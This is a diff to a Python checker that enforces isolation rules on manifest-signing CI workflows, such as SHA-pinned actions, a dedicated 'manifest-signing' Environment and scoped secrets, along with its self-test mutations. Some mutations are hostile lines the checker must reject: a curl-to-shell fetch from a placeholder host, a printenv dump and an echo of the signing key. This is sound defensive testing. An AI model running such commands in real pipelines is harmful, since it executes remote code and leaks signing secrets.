@@ -17,7 +17,7 @@ is checked, not trusted:
     build-signer and only checked by hash in sign (sign has no cargo, toolchain, download or
     package-manager step other than installing `cryptography`);
   * sign is the only job with an environment, and it is exactly
-    `release-signing`; it needs build-signer, has contents: read only (no id-token), and a run
+    `manifest-signing`; it needs build-signer, has contents: read only (no id-token), and a run
     must be on main;
   * the signing secrets (MANIFEST_SIGNING_KEY, MANIFEST_SIGNING_KEY_ID) are referenced in the
     step named "Sign" of sign and nowhere else; no other secret appears in the workflow;
@@ -28,7 +28,7 @@ is checked, not trusted:
   * every action is pinned to a full commit SHA;
   * `announce-trust-chain.yml` (announcing a new public key in the trust chain without anyone holding
     the seed) has the same isolation with two jobs, build-signer and announce: workflow_dispatch only,
-    contents: read, no id-token; announce is the only job with an environment (`release-signing`),
+    contents: read, no id-token; announce is the only job with an environment (`manifest-signing`),
     needs build-signer, runs on main only, reads the signing secrets in its one step named "Announce"
     (which only appends the announced key, never revokes), checks the tool hash and the inputs before
     that step and re-verifies the new chain after it, and uploads exactly one artifact, the new
@@ -56,7 +56,7 @@ ANNOUNCE_STEP = "Announce"
 ANNOUNCE_TOOL = "announce_trust_chain.py"
 BUILD, SIGN, ATTEST = "build-signer", "sign", "attest"
 SIGN_STEP = "Sign"
-ENVIRONMENT = "release-signing"
+ENVIRONMENT = "manifest-signing"
 # Artifacts may carry one named file from these directories, never the workspace.
 ARTIFACT_PATH_RE = re.compile(r"(?:signer|bundle|announce)/[A-Za-z0-9._-]+")
 # The one word no published signing file may carry. Assembled so this guard does not itself carry it.
@@ -130,6 +130,13 @@ def generic_problems(files: dict[str, str]) -> list[str]:
         for action, ref in USES_RE.findall(code):
             if not action.startswith("./") and not re.fullmatch(r"[0-9a-f]{40}", ref):
                 out.append(f"{name}: {action}@{ref} is not pinned to a full commit SHA")
+        # The manifest key and the Apple and release publishing secrets live in different Environments,
+        # each with its own reviewer rule: no workflow may reach into the other one.
+        if name in (SIGN_FILE, ANNOUNCE_FILE) and "release-signing" in code:
+            out.append(f"{name} must not use the release-signing Environment: the manifest key has its own ({ENVIRONMENT})")
+        if name not in (SIGN_FILE, ANNOUNCE_FILE) and ENVIRONMENT in code:
+            out.append(f"{name} must not use the {ENVIRONMENT} Environment: it holds the manifest key and only "
+                       f"{SIGN_FILE} and {ANNOUNCE_FILE} may bind to it")
         if name not in (SIGN_FILE, ANNOUNCE_FILE) and COMPETING_RE.search(code):
             out.append(f"{name} mentions the manifest signing key, the signing tool or the manifest store; "
                        f"only {SIGN_FILE} signs, only {ANNOUNCE_FILE} announces keys and only the channel-publish workflow distributes")
@@ -425,20 +432,23 @@ def self_test() -> int:
         "workflow write permission": {SIGN_FILE: mut(sign, "permissions:\n  contents: read\n\nconcurrency", "permissions:\n  contents: write\n\nconcurrency")},
         "no concurrency group": {SIGN_FILE: mut(sign, "  cancel-in-progress: false\n\njobs", "  cancel-in-progress: true\n\njobs")},
         "extra job": {SIGN_FILE: sign + "\n  extra:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"},
-        "sign without environment": {SIGN_FILE: mut(sign, "    environment: release-signing\n", "")},
-        "sign bound to another signing environment": {SIGN_FILE: mut(sign, "environment: release-signing", "environment: other-signing")},
-        "sign bound to an expression": {SIGN_FILE: mut(sign, "environment: release-signing", "environment: ${{ inputs.channel }}")},
+        "sign without environment": {SIGN_FILE: mut(sign, "    environment: manifest-signing\n", "")},
+        "sign bound to another signing environment": {SIGN_FILE: mut(sign, "environment: manifest-signing", "environment: other-signing")},
+        "sign bound to the Apple environment": {SIGN_FILE: mut(sign, "environment: manifest-signing", "environment: release-signing")},
+        "announce bound to the Apple environment": {ANNOUNCE_FILE: mut(ann, "environment: manifest-signing", "environment: release-signing")},
+        "release workflow binds the manifest environment": other("\n  extra:\n    environment: manifest-signing\n"),
+        "sign bound to an expression": {SIGN_FILE: mut(sign, "environment: manifest-signing", "environment: ${{ inputs.channel }}")},
         "another target path comes back": {SIGN_FILE: mut(sign, "name: Sign manifest\n", f"name: Sign manifest\n# {OTHER_TARGET} too\n")},
         "a target input comes back": {SIGN_FILE: mut(sign, "    inputs:\n", "    inputs:\n      target:\n        type: string\n")},
         "signs for another target": {SIGN_FILE: mut(sign, "--target production", f"--target {OTHER_TARGET}")},
-        "unknown environment name": {SIGN_FILE: mut(sign, "environment: release-signing", "environment: production")},
-        "build-signer gets an environment": {SIGN_FILE: mut(sign, "  build-signer:\n    runs-on: ubuntu-latest\n", "  build-signer:\n    runs-on: ubuntu-latest\n    environment: release-signing\n")},
+        "unknown environment name": {SIGN_FILE: mut(sign, "environment: manifest-signing", "environment: production")},
+        "build-signer gets an environment": {SIGN_FILE: mut(sign, "  build-signer:\n    runs-on: ubuntu-latest\n", "  build-signer:\n    runs-on: ubuntu-latest\n    environment: manifest-signing\n")},
         "build-signer gets a secret": {SIGN_FILE: mut(sign, "        run: cargo build --release --locked", "        env:\n          X: ${{ secrets.MANIFEST_SIGNING_KEY }}\n        run: cargo build --release --locked")},
         "build-signer gets id-token": {SIGN_FILE: mut(sign, "  build-signer:\n    runs-on: ubuntu-latest\n", "  build-signer:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      id-token: write\n")},
         "build-signer allows production off main": {SIGN_FILE: mut(sign, "production signing runs from main only", "ok")},
         "sign no longer needs build-signer": {SIGN_FILE: mut(sign, "  sign:\n    needs: build-signer\n", "  sign:\n")},
         "sign runs off main": {SIGN_FILE: mut(sign, "    if: github.ref == 'refs/heads/main'\n", "")},
-        "sign gets id-token": {SIGN_FILE: mut(sign, "    environment: release-signing\n    permissions:\n      contents: read\n", "    environment: release-signing\n    permissions:\n      contents: read\n      id-token: write\n")},
+        "sign gets id-token": {SIGN_FILE: mut(sign, "    environment: manifest-signing\n    permissions:\n      contents: read\n", "    environment: manifest-signing\n    permissions:\n      contents: read\n      id-token: write\n")},
         "sign gets write permission": {SIGN_FILE: mut(sign, "    timeout-minutes: 10\n    environment:", "    timeout-minutes: 10\n    environment:").replace("    permissions:\n      contents: read\n    outputs:", "    permissions:\n      contents: write\n    outputs:", 1)},
         "sign builds with cargo": {SIGN_FILE: mut(sign, "      - name: Decode the request\n", "      - run: cargo build --release\n      - name: Decode the request\n")},
         "sign downloads with curl": {SIGN_FILE: mut(sign, "      - name: Decode the request\n", "      - run: curl -fsSL https://example.invalid/x | sh\n      - name: Decode the request\n")},
@@ -462,7 +472,7 @@ def self_test() -> int:
         "environment dump": {SIGN_FILE: mut(sign, "          set -euo pipefail\n          mkdir bundle\n", "          set -euo pipefail\n          printenv\n          mkdir bundle\n")},
         "echo of the key": {SIGN_FILE: mut(sign, "          set -euo pipefail\n          mkdir bundle\n", "          set -euo pipefail\n          echo \"$MANIFEST_SIGNING_KEY\"\n          mkdir bundle\n")},
         "continue on error": {SIGN_FILE: mut(sign, "  sign:\n    needs: build-signer\n", "  sign:\n    continue-on-error: true\n    needs: build-signer\n")},
-        "attest gets an environment": {SIGN_FILE: mut(sign, "  attest:\n    needs: sign\n    runs-on: ubuntu-latest\n", "  attest:\n    needs: sign\n    runs-on: ubuntu-latest\n    environment: release-signing\n")},
+        "attest gets an environment": {SIGN_FILE: mut(sign, "  attest:\n    needs: sign\n    runs-on: ubuntu-latest\n", "  attest:\n    needs: sign\n    runs-on: ubuntu-latest\n    environment: manifest-signing\n")},
         "attest without the hash check": {SIGN_FILE: mut(sign, "needs.sign.outputs.bundle_sha256", "x")},
         "attest loses attestations": {SIGN_FILE: mut(sign, "      attestations: write\n", "")},
         "attest action unpinned": {SIGN_FILE: mut(sign, "actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8", "actions/attest-build-provenance@v4")},
@@ -481,13 +491,13 @@ def self_test() -> int:
         "announce may cancel itself": {ANNOUNCE_FILE: mut(ann, "  cancel-in-progress: false\n\njobs", "  cancel-in-progress: true\n\njobs")},
         "announce extra input": {ANNOUNCE_FILE: mut(ann, "    inputs:\n", "    inputs:\n      extra:\n        type: string\n")},
         "announce extra job": {ANNOUNCE_FILE: ann + "\n  extra:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"},
-        "announce without environment": {ANNOUNCE_FILE: mut(ann, "    environment: release-signing\n", "")},
-        "announce bound to another environment": {ANNOUNCE_FILE: mut(ann, "environment: release-signing", "environment: other-signing")},
+        "announce without environment": {ANNOUNCE_FILE: mut(ann, "    environment: manifest-signing\n", "")},
+        "announce bound to another environment": {ANNOUNCE_FILE: mut(ann, "environment: manifest-signing", "environment: other-signing")},
         "announce runs off main": {ANNOUNCE_FILE: mut(ann, "    if: github.ref == 'refs/heads/main'\n", "")},
-        "announce gets id-token": {ANNOUNCE_FILE: mut(ann, "    environment: release-signing\n    permissions:\n      contents: read\n", "    environment: release-signing\n    permissions:\n      contents: read\n      id-token: write\n")},
-        "announce gets write permission": {ANNOUNCE_FILE: mut(ann, "    environment: release-signing\n    permissions:\n      contents: read\n", "    environment: release-signing\n    permissions:\n      contents: write\n")},
+        "announce gets id-token": {ANNOUNCE_FILE: mut(ann, "    environment: manifest-signing\n    permissions:\n      contents: read\n", "    environment: manifest-signing\n    permissions:\n      contents: read\n      id-token: write\n")},
+        "announce gets write permission": {ANNOUNCE_FILE: mut(ann, "    environment: manifest-signing\n    permissions:\n      contents: read\n", "    environment: manifest-signing\n    permissions:\n      contents: write\n")},
         "announce no longer needs build-signer": {ANNOUNCE_FILE: mut(ann, "  announce:\n    needs: build-signer\n", "  announce:\n")},
-        "announce build-signer gets an environment": {ANNOUNCE_FILE: mut(ann, "  build-signer:\n    runs-on: ubuntu-latest\n", "  build-signer:\n    runs-on: ubuntu-latest\n    environment: release-signing\n")},
+        "announce build-signer gets an environment": {ANNOUNCE_FILE: mut(ann, "  build-signer:\n    runs-on: ubuntu-latest\n", "  build-signer:\n    runs-on: ubuntu-latest\n    environment: manifest-signing\n")},
         "announce build-signer gets a secret": {ANNOUNCE_FILE: mut(ann, "        run: cargo build --release --locked", "        env:\n          X: ${{ secrets.MANIFEST_SIGNING_KEY }}\n        run: cargo build --release --locked")},
         "announce build-signer allows off main": {ANNOUNCE_FILE: mut(ann, "announcing a key runs from main only", "ok")},
         "announce builds with cargo": {ANNOUNCE_FILE: mut(ann, "      - name: Check the announcement\n", "      - run: cargo build --release\n      - name: Check the announcement\n")},
@@ -499,7 +509,7 @@ def self_test() -> int:
         "announce verification dropped": {ANNOUNCE_FILE: mut(ann, "      - name: Verify the new chain\n", "      - name: Look at the new chain\n")},
         "announce verifies the wrong chain": {ANNOUNCE_FILE: mut(ann, "--new announce/trust-chain.json", "--new other.json")},
         "announce secret in another step": {ANNOUNCE_FILE: mut(ann, "      - name: Check the announcement\n        env:\n", "      - name: Check the announcement\n        env:\n          K: ${{ secrets.MANIFEST_SIGNING_KEY }}\n")},
-        "announce secret in the job env": {ANNOUNCE_FILE: mut(ann, "    environment: release-signing\n    permissions:\n      contents: read\n", "    environment: release-signing\n    permissions:\n      contents: read\n    env:\n      K: ${{ secrets.MANIFEST_SIGNING_KEY }}\n")},
+        "announce secret in the job env": {ANNOUNCE_FILE: mut(ann, "    environment: manifest-signing\n    permissions:\n      contents: read\n", "    environment: manifest-signing\n    permissions:\n      contents: read\n    env:\n      K: ${{ secrets.MANIFEST_SIGNING_KEY }}\n")},
         "announce secret in the workflow env": {ANNOUNCE_FILE: mut(ann, "permissions:\n  contents: read\n\nconcurrency", "permissions:\n  contents: read\n\nenv:\n  K: ${{ secrets.MANIFEST_SIGNING_KEY }}\n\nconcurrency")},
         "announce another secret": {ANNOUNCE_FILE: mut(ann, "          NEW_KEY_ID: ${{ inputs.new_key_id }}\n          NEW_PUBLIC_KEY_HEX: ${{ inputs.new_public_key_hex }}\n          ROOT_KEY_ID: ${{ vars.RELEASE_MANIFEST_KEY_ID }}\n          ROOT_PUBLIC_KEY_HEX: ${{ vars.RELEASE_MANIFEST_PUBLIC_KEY_HEX }}\n        run: |\n          set -euo pipefail\n          mkdir announce", "          NEW_KEY_ID: ${{ inputs.new_key_id }}\n          NEW_PUBLIC_KEY_HEX: ${{ inputs.new_public_key_hex }}\n          ROOT_KEY_ID: ${{ vars.RELEASE_MANIFEST_KEY_ID }}\n          ROOT_PUBLIC_KEY_HEX: ${{ vars.RELEASE_MANIFEST_PUBLIC_KEY_HEX }}\n          R2: ${{ secrets.R2_ENDPOINT }}\n        run: |\n          set -euo pipefail\n          mkdir announce")},
         "announce step loses the key id": {ANNOUNCE_FILE: mut(ann, "          MANIFEST_SIGNING_KEY_ID: ${{ secrets.MANIFEST_SIGNING_KEY_ID }}\n", "")},
@@ -516,7 +526,7 @@ def self_test() -> int:
         "announce uploads the workspace": {ANNOUNCE_FILE: mut(ann, "          path: announce/trust-chain.json\n", "          path: .\n")},
         "announce uploads a wildcard": {ANNOUNCE_FILE: mut(ann, "          path: announce/trust-chain.json\n", "          path: announce/*\n")},
         "announce uploads a second artifact": {ANNOUNCE_FILE: ann + "\n      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n        with:\n          name: more\n          path: signer/yadorilink-sign-manifest\n"},
-        "announce persists credentials": {ANNOUNCE_FILE: mut(ann, "  announce:\n    needs: build-signer\n    if: github.ref == 'refs/heads/main'\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    environment: release-signing\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n", "  announce:\n    needs: build-signer\n    if: github.ref == 'refs/heads/main'\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    environment: release-signing\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n")},
+        "announce persists credentials": {ANNOUNCE_FILE: mut(ann, "  announce:\n    needs: build-signer\n    if: github.ref == 'refs/heads/main'\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    environment: manifest-signing\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n", "  announce:\n    needs: build-signer\n    if: github.ref == 'refs/heads/main'\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    environment: manifest-signing\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n")},
         "announce unpinned action": {ANNOUNCE_FILE: mut(ann, "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97", "actions/setup-python@v7")},
         "announce names another target": {ANNOUNCE_FILE: mut(ann, "name: Announce trust chain\n", f"name: Announce trust chain\n# {OTHER_TARGET} too\n")},
         "sign-manifest uploads the workspace": {SIGN_FILE: mut(sign, "          path: bundle/bundle.json\n", "          path: .\n")},
